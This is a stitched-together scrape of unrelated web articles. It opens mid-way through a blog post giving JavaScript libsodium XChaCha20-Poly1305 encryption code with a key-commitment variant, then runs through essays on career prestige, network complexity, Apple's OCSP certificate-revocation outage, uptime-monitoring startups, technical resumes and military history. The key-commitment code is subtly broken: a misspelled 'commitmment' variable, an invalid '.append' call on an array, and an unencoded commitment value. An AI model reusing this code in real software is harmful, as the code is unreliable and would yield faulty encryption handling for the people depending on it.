    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(50));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        key,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Under-the-hood, this is using <a href="https://soatok.blog/2020/07/12/comparison-of-symmetric-encryption-methods/#aes-gcm-vs-xchacha20poly1305">XChaCha20-Poly1305</a>, which is less sensitive to timing leaks than AES-GCM. However, like AES-GCM, this encryption mode doesn’t provide <a href="https://eprint.iacr.org/2019/016">message- or key-commitment</a>.</p>



<p>If you want key commitment, you should derive two keys from <code>$key</code> using a KDF based on hash functions: One for actual encryption, and the other <a href="https://eprint.iacr.org/2020/1153">as a key commitment value</a>.</p>



<p>If you want message commitment, you can use AES-CTR + HMAC-SHA256 or XChaCha20 + BLAKE2b-MAC.</p>



<p>If you want both, ask <a href="https://mumble.net/~campbell/">Taylor Campbell</a> about his BLAKE3-based design.</p>



<p>A modified version of the above code with key-commitment might look like this:</p>


<pre title="">const VERSION = "v2";

/**
 * Derive an encryption key and a commitment hash.
 * @param {CryptographyKey} key
 * @param {Uint8Array} nonce
 * @returns {{encKey: CryptographyKey, commitment: Uint8Array}}
 */
async function deriveKeys(key, nonce) {
    const encKey = new CryptographyKey(await sodium.crypto_generichash(
        new Uint8Array([0x01].append(nonce)),
        key
    ));
    const commitment = await sodium.crypto_generichash(
        new Uint8Array([0x02].append(nonce)),
        key
    );
    return {encKey, commitment};
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });
    const {encKey, commitment} = await deriveKeys(key, nonce);

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        encKey,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       commitmment +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(114));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    const storedCommitment = await sodium.sodium_hex2bin(encrypted.slice(50, 114));
    const {encKey, commitment} = await deriveKeys(key, nonce);
    if (!sodium.sodium_memcmp(storedCommitment, commitment)) {
        throw new Error("Incorrect commitment value");
    }
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        encKey,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Another design choice you might make is to encode ciphertext with base64 instead of hexadecimal. That doesn’t significantly alter the design here, but it does mean your decoding logic has to accommodate this.</p>



<p>You SHOULD version your ciphertexts, and include this in the AAD provided to your AEAD encryption mode. I used “v1” and “v2” as a version string above, but you can use your software name for that too.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>For the past year, I've been on a leave of absence from college working on a startup. As I prepare for my return to school, what comes next has been on my mind.</p><p>Leaving college made me realize there are more career options than ever seemed available to me as a student. I would have expected that taking time off would have had the opposite effect—bringing me up to speed on the areas that interest me and those I should steer clear of. Naturally, the list of options should have winnowed after stepping outside of the college bubble. On the contrary, I find myself with dozens of ideas of things to work on, far more than what seemed possible in college.</p><p>College made it seem like there were just a few worthwhile career tracks. When I chose to take time off, I left in the middle of my junior year during the peak of on-campus recruiting, the process by which Harvard students compete for internships at a narrow list of companies. I say "narrow" to emphasize the fact that just three industries captured the attention of my peers: <strong>finance, big tech, and consulting (FTC)</strong>. When you subtract out the students attending grad school or who don't immediately enter the workforce, nearly half choose one of these fields.<sup id="fnref-1"><a href="#fn-1">1</a></sup> Why?</p><h3>Why FTC?</h3><p>The simplest explanation is money. Students want high-paying jobs and these are industries that pay higher on average. But it's naive to chalk all of this up to economics—there are many instances when students are offered an equally competitive job in terms of salary and still opt for FTC. I recall many different industries, such as consumer packaged goods companies, recruiting and offering salaries similar to entry-level management consulting—but they were seldom the talk of campus.</p><p>Neither is it interest. The average Harvard student would probably prefer to work on Google Maps over Kraft Mac &amp; Cheese, but this doesn't explain why students have such narrow interests <em>within</em> FTC. Why are Google and Facebook so attractive to prospective engineers while Stripe and Nvidia are never brought up? Or why do aspiring consultants obsess over McKinsey, Bain, and BCG to the exclusion of more boutique firms with similar compensation structures?<sup id="fnref-2"><a href="#fn-2">2</a></sup> Holding interest constant, students' decisions are still clustered around a few companies.</p><p>When discussing management consulting, many students talked about how they liked the "optionality" that the industry offered. In short, they viewed it as a few more years of college without the pressure to choose a particular career path. I think people felt similarly about finance and big tech—they didn't narrow your career trajectory in the same way a more niche company might have. But again, this doesn't explain why within FTC, students are still so fixated on a few specific companies.</p><p>When I asked my peers why they preferred these particular firms, they often answered that they were better than the rest of the industry. But by which logic are they better? When asked about the specifics, they'd often give vague non-answers that seemed almost scripted. "I like Bain because I feel like I have a good fit with the firm". Or, "Goldman is attractive to me because it has a culture of excellence." These answers were unsatisfying because it was clear they were ad hoc rationalizations. Thankfully, one student was once blunt enough to confirm what everyone already knew: "I want Google on my resume because it is prestigious." For most, these firms were top of mind because they were prestigious, not because they resonated particularly well with the individual applicant.</p><p>For students unsure of what career to pursue, prestige is often the driving metric in job selection. For many, prestige is useful in that it guarantees one is respected and admired for the job they ultimately choose. This explains the ad hoc rationalizations from before and why students often expressed interest in FTC before they even fully understood what their work would entail. it's like a kindergartener saying "doctor" when adults ask them what they want to be when they grow up. Their answer says more about the desires of the group than themselves.<sup id="fnref-3"><a href="#fn-3">3</a></sup></p><h3>What is Prestige?</h3><p>Prestige is a measure of how much status a group assigns to something. From this definition, a lot of interesting qualities of prestige can be discerned.</p><p>Since prestige depends upon what the <em>group</em> thinks, then it follows that it is not a fixed nor immutable quality. Groups of people differ everywhere, so what is prestigious in one place is not necessarily prestigious in another.</p><p>For example, many college students would love to work for a Silicon Valley startup—but I know of few Harvard students who prefer startups over big tech. Again, this isn't an economic decision—recruits of later-stage startups can command the same or even better compensation than FAANG in some cases—but I've never heard of a Harvard CS major wanting to work for Stripe.<sup id="fnref-4"><a href="#fn-4">4</a></sup> This is surprising since Stripe is prestigious <em>within</em> the Valley itself. Prestige's dependence on the group makes it a localized phenomenon.</p><p>Prestige also changes over time. What we considered prestigious a hundred years ago is very different from what we do today because social status has changed a lot. Understanding the evolution of social status is worthy of a whole separate essay (or perhaps a book). However, I suspect that prestige is closely linked to our economy and thus downstream of culture, policy, and most of all, technology. This would explain why it's more prestigious to start a startup today than it was a hundred years ago—one can simply become a lot richer than they could before.</p><h3>The Roots of Prestige</h3><p>So if prestige depends upon what people find to be high status, then where does it originate in the first place? That is, how does a group come to deem something prestigious initially? The best <a href="http://www.paulgraham.com/love.html">explanation</a> for prestige I've seen thus far comes from Paul Graham:</p><blockquote><p>"Prestige is just fossilized inspiration. If you do anything well enough, you'll <em>make</em> it prestigious. Plenty of things we now consider prestigious were anything but at first. Jazz comes to mind—though almost any established art form would do. So just do what you like, and let prestige take care of itself."</p></blockquote><p>Groups assign status to the things which accurately signal the values and aspirations of that group. For elite college students, FTC originally became prestigious because they represented the height of excellence in the workforce at some point—something this group deeply values.</p><p>Each of the top companies within FTC once transformed their industries, inspiring the ambitious to follow suit. For example, James McKinsey <a href="https://longreads.com/2013/10/23/the-making-of-mckinsey-a-brief-history-of-management/">invented</a> managerial accounting and dramatically improved his clients' budgeting processes. Goldman employees <a href="https://www.goldmansachs.com/our-firm/history/a-brief-history-of-gs.pdf">pioneered</a> the price-to-earnings ratio, now ubiquitous in modern finance. And of course, Gates, Jobs, and other big tech founders are revered in American culture. These accomplishments earned their firms a prestigious reputation once, and they've managed to keep it ever since.</p><p>Prestige is self-reinforcing for its holders in the same way that network effects make big tech hard to topple. Namely, prestigious firms leverage their name and rigorous hiring practices to target top students for recruitment. As students see the best of their class joining these firms, the companies' reputation becomes further entrenched, attracting the next generation of talent. Prestige acts as a competitive moat for these firms and replicates itself over time.</p><h3>The Prestige Trap</h3><p>At first glance, it doesn't seem worrisome to factor prestige into one's job search. If these firms benefit so greatly from their prestige, wouldn't students also be well-served by having them on their resume? Maybe, but only if students are focusing on the right thing.</p><p>Prestige, like the social status it serves as a proxy for, is useful as a form of signaling. To the uninformed observer, it indicates that one is a member of the highly successful creative class. We assume, because we associate these firms with excellence, that possessing prestigious titles demonstrates excellence too. Furthermore, it's hard to evaluate people individually, so we often outsource our decision making and rely upon prestige as a neutral arbiter, regardless of its accuracy.</p><p>If third-parties look at prestige as an indicator of excellence, then it becomes a rough heuristic for replicating success in one's social environment. The top FTC companies represent an opportunity for elite students to become a James McKinsey or Henry Goldman in their own right. Ambitious students seek out prestige thinking it is the missing ingredient to achieving their own excellence. In reality, they have it backward—prestige <em>follows</em> excellence. Exposure to prestige can't make you successful any more than spending time around rich people can make you wealthy.<sup id="fnref-5"><a href="#fn-5">5</a></sup></p><p>Achieving prestige and excellence are not mutually exclusive. Although, one does depend upon the other. Pursuing prestige for its own sake will not lead to excellence, but the reverse can occur. When most ambitious students turn to prestige as a heuristic, they're really just trying to answer the question: "How do I become successful in life and achieve great things?" This explains why many of my peers returned from these prestigious jobs and internships, feeling more dissatisfied than before. They realized that what they were looking for was deeper and more nuanced than could be provided for by an additional resume item.</p><p>Unfortunately, optimizing for prestige is a poor source of evolutionary pressure. It is usually easier to feign excellence than for one to actually cultivate it. Getting a job at a big tech company is a very different thing than becoming an excellent software engineer. A student can find themselves with all of the trappings of success—the distinguished credentials, resume fillers, and prestigious titles—but without having achieved the true excellence they were seeking in the first place. In this way, prestige becomes a trap.</p><p>Why do top students fall for this trap and chase …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
		<p>If you are looking for a good resolution for 2020 still (I know, it’s a bit late), you can’t go wrong with this one: <em>this year, I will focus on making the networks and products I work on truly simpler. </em>Now, before you pull Tom’s take out on me—</p>
<blockquote><p><a href="https://networkingnerd.net/2019/12/27/fast-friday-keeping-up-with-the-times/">There are those that would say that what we’re doing is just hiding the complexity behind another layer of abstraction, which is a favorite saying of Russ White. I’d argue that we’re not hiding the complexity as much as we’re putting it back where it belongs – out of sight. We don’t need the added complexity for most operations.</a></p></blockquote>
<p>Three things: <em><strong>First,</strong> complex solutions are always required for hard problems.</em> If you’ve ever listened to me talk about complexity, you’ve probably seen this quote on a slide someplace—</p>
<blockquote><p><a href="https://faculty.nps.edu/dlalders/docs/AldersonDoyle-tsmca-July2010.pdf">[C]omplexity is most succinctly discussed in terms of functionality and its robustness. Specifically, we argue that complexity in highly organized systems arises primarily from design strategies intended to create robustness to uncertainty in their environments and component parts.</a></p></blockquote>
<p>You <em>cannot</em> solve hard problems—complex problems—without complex solutions. In fact, a lot of the complexity we run into in our everyday lives is a result of saying “this is too complex, I’m going to build something simpler.” <em>(here I’m thinking of a blog post I read last year that said “when we were building containers, we looked at routing and realized how complex it was… so we invented something simpler… which, of course, turned out to be more complex than dynamic routing!)</em></p>
<p><em><strong>Second,</strong> abstraction can be used the right way to manage complexity, and it can be used the wrong way to obfuscate or mask complexity.</em> The second great source of complexity and system failure in our world is we don’t abstract complexity so much as we obfuscate it.</p>
<p><em><strong>Third,</strong> abstraction is not a zero-sum game</em><strong>.</strong> If you haven’t found the tradeoffs, you haven’t looked hard enough. This is something expressed through the state/optimization/surface triangle, which you should <em>know</em> at this point.</p>
<p>Returning to the top of this post, the point is this: Using abstraction to manage complexity is fine. Obfuscation of complexity is not. Papering over complexity “just because I can” never solves the problem, any more than sweeping dirt under the rug, or papering over the old paint without bothering to fix the wall first.</p>
<p>We need to go beyond just figuring out how to make the user interface simpler, more “intent-driven,” automated, or whatever it is. We need to think of the network as a system, rather than as a collection of bits and bobs that we’ve thrown together across the years. We need to think about the modules horizontally and vertically, think about how they interact, understand how each piece works, understand how each abstraction leaks, and be able to ask hard questions.</p>
<p>For each module, we need to understand how things work well enough to ask <em>is this the right place to divide these two modules?</em> We should be willing to rethink our abstraction lines, the placement of modules, and how things fit together. Sometimes moving an abstraction point around can greatly simplify a design while increasing optimal behavior. Other times it’s worth it to reduce optimization to build a simpler mouse trap. <em>But you cannot know the answer to this question until you ask it.</em> If you’re sweeping complexity under the rug because… <em>well, that’s where it belongs…</em> then you are doing yourself and the organization you work for a disfavor, plain and simple. Whatever you sweep under the rug of obfuscation will grow and multiply. You don’t want to be around when it crawls back out from under that rug.</p>
<p>For each module, we need to learn how to ask <em>is this the right level and kind of abstraction?</em> We need to learn to ask <em>does the set of functions this module is doing really “hang together,” or is this just a bunch of cruft no-one could figure out what to do with, so they shoved it all in a black box and called it done?</em></p>
<p>Above all, we need to learn to look at the network as a system. I’ve been harping on this for so long, and yet I still don’t think people understand what I am saying a lot of times. So I guess I’ll just have to keep saying it. 😊</p>
<p>The problems networks are designed to solve are hard—therefore, networks are going to be complex. You cannot eliminate complexity, but you can learn to minimize and control it. Abstraction within a well-thought-out system is a valid and useful way to control complexity and understanding how and where to create modules at the edges of which abstraction can take place is a valid and useful way of controlling complexity.</p>
<p><strong>Don’t obfuscate. Think systemically, think about the tradeoffs, and abstract wisely.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="44" id="block-yui_3_17_2_1_1605368314078_14495"><div><p>On November 12, 2020 Apple released macOS Big Sur. In the hours after the release went live, somewhere in Apple's infrastructure an Online Certificate Status Protocol (OCSP) responder cried out in pain, dropping to its knees, begging for mercy as load increased beyond what it could handle. The OCSP responder slowing down, being a critical aspect of a modern public key infrastructure (PKI), makes it hard for clients of the PKI to verify the validity of identity documents. These documents, called X.509 Certificates, are attached to every verified application the user is launching on their Mac. Mayhem ensued, and after the issues were cleaned up, many questions remained about the implications of this failure. But first, let's take a look at the mechanisms involved in authenticating an application package, at the most fundamental level.</p>

<p>The X.509 is a ratified ITU specification that defines (among other things) a standard representation for documents that convey trust relationships between entities, known as Certificates. Certificates can be thought of as policy documents. Any X.509 certificate consists of</p>
<ul>
<li>a public key,</li>
<li>an indication who the certificate was issued for,</li>
<li>what actions the authority allows the certificate holder to perform,</li>
<li>the date the certificate is first valid on,</li>
<li>the date the certificate expires on,</li>
<li>metadata about how to check if the certificate has been revoked (optional, but highly recommended),</li>
<li>the authority who issued the certificate, and</li>
<li>a signature across all this metadata, from the authority.</li>
</ul>
<p>By retrieving the authority certificate, one can verify the integrity of the issued certificate. In fact, most authority certificates were issued by an even higher authority. By verifying all the way up to the root entity certificate (the "self-signed" highest level authority), it is possible to get a high degree of confidence of the provenance of the end entity certificate. Oftentimes a certain set of policy requirements must be met for an authority to issue a certificate to an end entity, or any intermediate entity. A certificate can be viewed as an embodiment of the proof that the authorities involved performed the appropriate checks to make sure all these conditions were met. If you fail these checks, an authority should not issue you a certificate!</p>
<p>The ceremony of creating these documents, how to interpret the document, how to represent the hierarchy of business trust decisions are all encoded in a certificate chain. Certificate chains are powerful concepts: they can be used to verify an authority who generated a public key, and who verified it was done to a certain standard. By reducing the scope of public keys to only keys you trust by specifying only certain root authorities you will accept certificate chains originating from, you can make a policy to reject any public keys (and thus any certificates) that were issued by a different authority.</p>
<h2 id="the-hard-part-revocation">The Hard Part: Revocation</h2>
<p>But what if, after the date the certificate is issued and before the date the certificate expires, something goes wrong? Maybe the authority decides that the entity the certificate was issued to has committed some malfeasance, and revokes their certificate. Sometimes the private key for a certificate is stolen, and so the assertions about who the party is that the certificate represents are no longer true, since an entity with the stolen key could impersonate the legitimate original party. There are numerous reasons why a certificate could be revoked.</p>
<p>One of the fantastic design attributes of X.509 is the fact that you should be able to perform X.509 certificate chain validation offline. So long as you have an accurate idea of what the current date is and what root entities you trust, it's (relatively) easy for a party to verify a certificate chain. The offline verification confers a great deal of resilience upon the system. But this revocation problem remains a challenge - for some systems you need to be able to check back with the authority who issued the certificate and ask "hey, is this assertion you made still valid?"</p>
<p>To solve this problem, there are three common mechanisms in use today. First, most authorities publish certificate revocation lists (CRLs). This list, signed by the issuing authority, can be periodically downloaded from a location specified in the certificate's metadata (say on a daily basis). When performing certificate validation, the locally downloaded copy of the CRL will provide a indication if a certificate has been revoked. These CRLs can get quite large though, and having to wait for the CRL to be refreshed for a revocation to take effect could be risky for certain applications. CRLs work for certain use cases, but the storage and update frequency trade-offs are significant.</p>
<p>Enter OCSP. When an authority offers an OCSP responder, the URL for the responder is also encoded in the certificate. A certificate verifier can make a call to the OCSP responder, with the serial number of the certificate to be verified. The OCSP responder checks against its database of revoked certificates. The OCSP responder will then respond with a simple "valid" or "revoked" to the query, and the calling party can then decide what to do with that information. Of course, this means that the OCSP responder can log each and every one of these queries, and build a very useful paper trail to help monitor user behaviour. This risk, along with the systemic resiliency challenges, led to a search for a middle ground.</p>
<p>The final mode is a variant on calling the OCSP responder. An OCSP responder can issue a short-lived, cryptographically signed document to a certificate holder. This document is "stapled" together with the certificate, and is sent to to the verifying party. So long as the time stamps match up, the recipient can assume (within some bounded risk) that the certificate is still valid, per the issuing authority. Of course, this approach only works for certain use cases (usually connectivity-oriented usage), but it does anonymize the certificate verifying parties.</p>
<p>Apple chose the second revocation model for app certificate verification. This mode has its benefits - revocation can be performed in real-time. So, if Apple finds that an app they issued a certificate to is actually malware, they can rapidly revoke this certificate and prevent the malware from running, even on machines it has already installed itself on. This does put a lot of policy control in Apple's hands. This is where you have to make a business decision as to whether or not you trust Apple to be benevolent or not.</p>

<p>A signed application is an interesting corner case in certificate validation. Certificates are valid for a certain range of dates. Additionally, applications don't involve (at least at launch time) any sort of exchange between a server and a client that can perform an OCSP lookup on your behalf. This limits the options we have.</p>
<p>The first problem is more nuanced than one might think. Should an application, signed at a specific point in time, be only launchable between the validity start/end dates of the certificate issued to sign the application? Probably not - this puts an artificial horizon on the application being valid, and if this is an app you paid a lot of money for, this might be frustrating. Implementation details might vary, but there is a concept of a trusted timestamp server, where a timestamp with a nonce is signed by a trusted authority. By integrating a trusted timestamp into the bundle of attributes cryptographically verified by the application launcher, we can reduce this problem to only needing to verify the app signing certificate was valid <em>at the time the bundle was signed</em>. So the current calendar date is irrelevant for determining this validity, but rather the date that has been bundled into the signed app is to be used.</p>
<p>The second problem limits your options for handling revocation. A CRL might be useful in a subset of cases - for example if large swaths of certificates are to be revoked. However, there are some concerns with this approach, beyond scalability and size of these revocation lists. One operational concern is that you could be leaking information about which certificates have been revoked, or providing insight into the revocation process. This could be exploited by malfeasant actors to game the certificate issuing process, or at least make it more obvious which certificates have been revoked and when, so malware developers could get more insight into the process, giving them an edge in "gaming the system."</p>
<p>Apple opted to solve this problem with an OCSP responder. So at every launch of an app (perhaps outside of some window where the OCSP response could be cached - I have not looked into this detail), macOS would dutifully check if the certificate used by the signer is still valid, per the OCSP responder. Of course, if macOS couldn't reach the OCSP responder, it would go about its merry way launching an app. After all, a computer needs to work offline, too.</p>

<p>An OCSP responder certainly would generate logs, as we discussed before. Those logs could contain the serial numbers of certificates that users had requested be checked, as well as the IP address of the requestor. Apple certainly has a database that maps a serial number back to the actual X.509 certificate, which then can likely be used to identify what app(s) this certificate was used to sign. The metadata about the request could likely be mapped back to who you are (through the power of AppleID, perhaps), the and the attributes of the certificate could be tied to your app store purchases (or lack thereof). Theoretically, this could be used to clamp down on piracy, private software distribution and other free use of a device.</p>
<p>But here is where we have to consider the user. I'm knee-deep in systems security problems, day-in and day-out. All these systems we interact with have become more complex than what most people (myself included) can maintain a mental model of. …</p></div></div></div>

                <div>
                    <p>Take a look at this research <a href="https://www.supermonitoring.com/blog/website-monitoring-tools-market-in-2020/">https://www.supermonitoring.com/blog/website-monitoring-tools-market-in-2020/</a></p><p>It states that there are around 170 uptime monitoring services. Despite this fact, I decided to make another one. Before you roll your eyes, let me explain the reasons for making such a decision. At the end of the article, you'll find a comment on hacker news that answers the question.</p><p>First of all, let's accept the term that I consider people who are solo-founders who have enough time &amp; desire to make their products. I'm not talking about an investment of millions of dollars, complex financial calculations of risks/profits, creating a big company with hundreds of employees. I'm talking about small businesses.</p><p>Having such people in mind, let's see what their thoughts can be before starting a new product.</p><p>Most of them refuse to create something alleging that:</p><ul><li>They don't have a brilliant idea</li><li>They don't have enough money/time</li><li>The idea was already implemented / there are a lot of competitors in the area</li></ul><p>Let's examine these statements.</p><h3 id="no-brilliant-idea">No brilliant idea</h3><p>Let me ask: Does every successful product have a brilliant idea? Does every successful business have an idea at all? If so, <a href="https://alternativeto.net/">https://alternativeto.net/</a> didn't exist.</p><p>Everyone knows that idea worth nothing. Implementation does. Marketing does.</p><p>How often do we hear: "Gosh, why nobody solves this, isn't it obvious that people should solver this?!". But why the person who says that didn't solve it, if it's obvious?</p><p>Now, you may argue that new products appearing in the market have USP, Unique Selling Proposition. Usually, yes, however, the USP turns around the idea which was already implemented. They just enhanced it a bit but haven't invented something completely new.</p><p>There are hundreds of to-do apps that solve the task of taking notes of what a person should do.</p><p>There are hundreds of chat apps that solve the task of communicating between people.</p><p>There are hundreds of CRM apps that sole the task of handling customers.</p><h3 id="no-money-time">No money / time</h3><p>When it comes to money, I have the same question: Did every successful business have initial funding?</p><p>As for time, I would agree that this is somewhat necessary if we don't consider funding or investment. Even if we do, we still need to spend some amount of time.</p><h3 id="it-was-already-implemented">It was already implemented</h3><p>Okay, now a person has desire and time.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>The purpose of your technical resume is to generate interview requests. A successful resume attracts more interest, from more of the companies you want to interview with, for more of the jobs you would be happy to take.</p><p>You might think of a resume as your personal summary document, covering all of your life’s work to date. But it’s better to think of your resume as a business document that helps you advertise your capabilities to a future employer.</p><p>I’ve worked with thousands of employers, published the <a href="https://www.businessinsider.com/heres-what-recruiters-look-at-during-the-6-seconds-they-spend-on-your-resume-2012-4">ground-breaking research</a> into recruiter resume review time, and written several bestsellers on resumes and other career topics. And that’s why I’m now writing <a href="https://signup.meetleet.com/">great technical resumes for free</a>. Resumes, when done right, are great help in accelerating your career.</p><p>Here are a few things a <a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">technical resume</a> is not:</p><ul><li>Not your autobiography</li><li>Not a comprehensive catalog of everything you’ve done</li><li>Not a way to make you feel good about yourself (though it might also do that)</li><li>Not an academic CV</li><li>Not where you need to explain past ‘bad situations’</li><li>Not where you need to explain why you left prior jobs</li></ul><p>No, a technical resume is none of those things. And that’s because none of those things help get you hired.</p><p>Instead, a technical resume’s primary purpose is to generate interview requests for you. It’s where you make the case to “please pick me out of the pile.”</p><p>(Secondarily, a resume is a useful page of notes to use during interviews, especially behavioral interviews. We all know how our minds can go blank during interviews and it’s useful to have something to aid your memory in those moments.)</p><p>What’s the best way to get a hiring manager or future boss to select your resume from the pile? </p><p>It’s to make it as clear as possible which types of problems you’ve solved in the past, and how well you solved them. With that information, hiring managers have the easiest time in predicting what you can do for them in the future.</p><p>Unfortunately, most technology professionals take the easy way out, and copy and paste their job description into their resume. As a result, their <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> are full of sentences that begin “Responsible for” or “Worked on” or “Assigned to.”</p><p>This is a mistake because your future employer is not going to hire you for your past <strong>responsibilities</strong>. Rather, they will hire you for your past <strong>successes</strong>. It’s your achievements and results in technology that get you promoted and elevated to ever-higher levels.</p><p>And that’s why great technical resumes focus on results, <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> and method. </p><p><strong>Results</strong>: for the technology you were working on, how did it make your company, team, or systems better? Did it increase, decrease, grow, shrink, improve, suppress, optimize, deprecate, add or remove something important for your company? For everything you’ve worked on, there was some reason you were doing it. Hopefully, that reason had to do with making things better. Share the result with your resume readers. </p><p><strong>Numbers</strong>: by how much did you make things better? As a technology professional, you’re used to numbers. We measure the success of what we do in numbers all the time: latency, loadtime, DAUs, Google score. Using numbers to describe the work you’ve done comes naturally in the field.</p><p>So the more you can use numbers to <strong>quantify</strong> how much you helped increase, decrease, grow, shrink, etc., the important metrics in your prior roles, the better and more persuasive your resume will be in getting picked out of the pile. </p><p><strong>Method</strong>: this is the technical “how I did it” part of a great technical resume. If you increased something by 50% what technologies or solutions or methodologies did you use to get there? If you shrank a different metric by 70%, what activities or behaviors or actions did you need to take to achieve this reduction?</p><p>Many technical resumes miss the results and the numbers and only list the method of how they did something. Unfortunately, that’s not as effective at attracting attention to get your resume picked out of the pile.</p><p>To demonstrate, the <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> below <strong>with</strong> <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> are much more powerful than the same bullet point <strong>without</strong> numbers.</p><ul><li>Responsible for for managing our AWS cloud services for cost, reliability and scalability.</li><li>Reduced costs 17% by decommissioning 42 ec2 instances in our AWS implementation while managing for costs, reliability and scalability.</li></ul><ul><li>Refactored our front/end experience using React.</li><li>Increased user engagement 27% by refactoring our front-end experience in React.</li></ul><p>Combining results, numbers and methods on your resume makes your experience stand out from the pile. And that’s the best way to fulfill the purpose of your resume - to get you interview requests.</p><p><a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">Great technical resumes</a> increase your chances of getting hired, and getting ahead in your career.

<p>This week, I want to talk about the discipline of military history: what it is, why it is important and how I see my own place within it.  This is going to be a bit of an unusual collections post as it is less about the past itself and more about how we study the past; it is also going to be a bit unusual in that it is mostly my own personal reflections, rather than a historical argument.</p>



<p>We do quite a lot of different kinds of history here on the blog.  There is a fair bit of<a href="https://acoup.blog/2019/09/07/new-acquisitions-class-status-and-the-early-church/"> social history,</a> some <a href="https://acoup.blog/2019/12/05/collections-a-trip-through-thucydides-fear-honor-and-interest/">intellectual </a><a href="https://acoup.blog/2019/12/12/collections-a-trip-through-cicero-natural-law/">history</a>, just a<a href="https://acoup.blog/2019/05/20/new-acquisitions-elective-monarchy-and-the-future-of-westeros/"> little bit of political history</a> and an absolute <a href="https://acoup.blog/tag/organic-economy/"><em>ton</em> of economic history</a>.  Obviously, I think all of those analytical lenses (and several I have not done, of course) are very important ways of understanding the past.  But a lot of what we discuss on the blog fits, narrowly or broadly, into the realm of <strong>military history</strong>.  And I want to talk about that.</p>



<p><strong>Now I should note that I do not consider myself purely a military historian</strong> – indeed, in my experience, few historians are ‘pure’ anything and if you narrow down their specialization enough, you simply end up with, “I am a historian of things which interest me” followed by a long list of what those are.  <strong>I see myself as both an economic and military historian (of the Mediterranean world, broadly construed)</strong> and my research tends to exist in the places where those two strands meet.  Sometimes that means processes that read as non-military (if it isn’t evident I have active research projects on farming and metal production, you haven’t been here long!) and sometimes those projects are more narrowly military.  <strong>I am a firm believer that a historian must be prepared to use whatever tools are going to provide the best answers to their research questions</strong>; for my own work, that has included (basic) statistical analysis, textual close reading, economic theory, archaeology (both traditional and experimental), social history, and even some chemistry and physics.  Whatever works!  But certainly, the methods of military history are one tool in my toolbox, even when I am looking to answer questions about non-military aspects of Mediterranean antiquity.</p>



<p><strong>It is no real secret that as a discipline, military history is sometimes held in low regard by other historians</strong>.  There are a number of reasons for this.  Often it has to do with outdated views on what military history <em>is</em> and what military historians <em>do</em>.  Frequently military history, because it has a large enthusiast and amateur audience, is regarded as an amateur field (something which is not helped by publishers who push quite out reams of quite frankly substandard works of this sort) lacking in sophistication, which is not accurate, but often believed.  And perhaps most often, in my experience, <strong>these opinions serve as cover for a deeper conviction that studying militaries and warfare is icky and only done by people who <em>like</em> war</strong> (when I was a student, this opinion when it was expressed by a certain generation of scholars, now mostly retired, came with a <em>very</em> predictable dose of Vietnam-era anti-military sentiment).  Often it seems the study of military history is neglected by other historians precisely because they find the subject matter uncomfortable.</p>



<p>So I want to talk about three major things here: what military history actually is and how it is done these days, why we should study military history and finally what my experience of being a military historian (both as a scholar and a teacher) has been, particularly given that I am a life-long civilian.  </p>

<h2>What is Military History?</h2>



<p>The popular conception of military history – indeed, the conception sometimes shared even by other historians – is that it is fundamentally a field about charting the course of armies, describing ‘great battles’ and praising the ‘strategic genius’ of this or that ‘great general.’  One of the more obvious examples of this assumption – and the contempt it brings – comes out of the popular CrashCourse youtube series.  When asked by their audience to cover military history related to their coverage of <em>the American Civil War</em>, the response was <a href="https://youtu.be/25HHVDOaGeE">this video listing battles </a>and reflecting on the pointless of the exercise, as if a list of battles was all that military history was (the same series would later say that military historians <a href="https://youtu.be/rlx6ur_D51s?t=323">don’t talk about about food</a>, a truly baffling statement given the important of logistics studies to the field; certainly in my own subfield, military historians tend to talk about food more than any other kind of historian except for dedicated food historians).</p>



